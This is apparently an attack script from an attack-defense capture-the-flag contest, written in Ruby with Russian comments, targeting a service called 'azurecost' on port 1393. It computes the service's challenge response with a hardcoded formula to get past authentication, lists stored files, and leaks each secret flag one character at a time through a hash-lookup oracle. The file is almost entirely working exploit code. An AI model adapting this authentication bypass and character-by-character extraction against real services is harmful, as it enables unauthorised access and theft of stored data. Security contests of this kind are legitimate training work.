#!/usr/bin/env ruby
require 'socket'
require 'timeout'
require 'yaml'
require 'hexdump'

#########################################
#
#   сервис: azurecost
#    порты: 1393
# алгоритм:
#
#########################################

TARGET_PORT = 1393

OUR_HOST = '10.12.21.8'
FLAG_RE  = /^[a-f0-9]{16}$/i

# координаты нашей постилки флагов
POST_FLAGS_HOST = "10.12.21.21"
POST_FLAGS_PORT = 12321

#########################################

STDOUT.sync = true

@host  = OUR_HOST
@ids   = {}
@flags = []
@fnames = {}

#raise "don't attack self!" if @host == OUR_HOST

class UnicodeSocket < TCPSocket
  def puts string
    write(string.split('').map{ |c|
      if c == "\n"
        "#{c}\x01\x00\x00"
      else
        "#{c}\x00\x00\x00"
      end
    }.join + "\n\x00\x00\x00")
  end

  def gets
    r = super
    r ? r.tr("\x00","") : r
  end
end

@hash = {}

@hash2char = YAML::load_file("data/1.yml").invert
#p @hash2char

def get_char socket, fname, i
  socket.puts "CHK #{fname} #{i.chr}"
  while true do
    s = socket.gets.strip
    if s["HASH:"]
      return @hash2char[s.sub("HASH: ",'').strip.to_i]
    end
  end
  nil
end

def get_flag host, fname
  puts "[.] #{fname}"
  socket = UnicodeSocket.new host, TARGET_PORT
  chal = socket.read(4).unpack('L')[0]
  resp = (chal^0xa7f7e284)**2 + 0xa82d3274
  socket.write([resp].pack('L'))

  r = ''
  16.times do |i|
    begin
      c = get_char(socket, fname, i+1)
    rescue
      socket = UnicodeSocket.new host, TARGET_PORT
      chal = socket.read(4).unpack('L')[0]
      resp = (chal^0xa7f7e284)**2 + 0xa82d3274
      socket.write([resp].pack('L'))
      retry
    end
    if c
      r << c
    else
      return nil
    end
  end
  r
end

def attack_host host
  socket = UnicodeSocket.new host, TARGET_PORT
  chal = socket.read(4).unpack('L')[0]
  resp = (chal^0xa7f7e284)**2 + 0xa82d3274
  socket.write([resp].pack('L'))

  socket.puts "LST"

  while true do
    s = socket.gets.strip
    p s
    break if s == "BEGIN of list"
  end

  fnames = []

  while true do
    s = socket.gets.strip
    p s
    break if s == "END of list"
    fnames << s
  end

  p fnames

  fnames.each do |fname|
    unless @fnames.key?(fname)
      flag = get_flag host, fname
      @fnames[fname] = flag
      if flag
        puts "[*] flag #{flag}"
        '01234567890abcdef'.split('').each do |c|
          @flags << flag.tr('*',c)
        end
      end
    end
  end
rescue
  p $!
end

attack_host @host
